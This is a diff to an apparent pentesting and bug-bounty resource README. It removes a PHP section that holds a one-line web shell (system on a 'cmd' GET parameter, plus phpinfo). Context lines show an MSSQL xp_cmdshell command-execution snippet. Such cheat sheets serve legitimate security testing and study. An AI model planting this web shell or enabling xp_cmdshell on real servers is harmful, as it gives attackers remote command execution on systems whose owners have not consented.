@@ -14,7 +14,6 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [WordPress](#wordpress)
 - [XSS](#xss)
 - [SQLi](#sqli)
-- [PHP](#php)
 - [DLL Hijacking](#dll-hijacking)
 - [Network](#network)
 - [Linux](#linux)
@@ -179,13 +178,6 @@ GO
 RECONFIGURE
 GO
 xp_cmdshell 'COMMAND';
-```
-
-### PHP
-
-shell.php
-```php
-<?php echo "<br/><center><h1>"; system('whoami'); echo "</h1></center>"; echo "<br/><br/>"; if(isset($_GET['cmd'])){system($_GET['cmd']); echo "<br/><br/>";} phpinfo(); ?>
 ```
 
 ### DLL Hijacking
